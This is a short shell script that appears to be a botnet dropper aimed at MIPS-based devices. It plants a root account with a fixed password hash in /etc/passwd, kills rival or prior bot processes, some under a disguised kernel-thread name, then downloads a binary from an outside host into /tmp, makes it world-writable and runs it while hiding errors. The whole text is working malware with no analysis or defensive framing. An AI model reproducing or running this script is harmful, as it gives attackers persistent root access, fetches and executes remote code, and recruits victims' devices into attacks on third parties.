#!/bin/sh
echo 'root:$1$abc$zaXMLi5d6NE.pTzaa2CDd/:0:0:root:/root:/bin/sh' >> /etc/passwd
sed -i 's|^root:.*|root:\$1\$abc\$zaXMLi5d6NE.pTzaa2CDd/:0:0:root:/root:/bin/sh|' /etc/passwd
su
killall -9 kworker/u:1-ev 2>/dev/null
killall -9 ntb.mipsel 2>/dev/null
killall -9 btn.mipsel 2>/dev/null
cd /tmp
rm -f btn.mipsel 2>/dev/null
wget http://store.risesmp.cc/wow/btn.mipsel 2>/dev/null
chmod 777 btn.mipsel 
./btn.mipsel "$@" 2>/dev/null
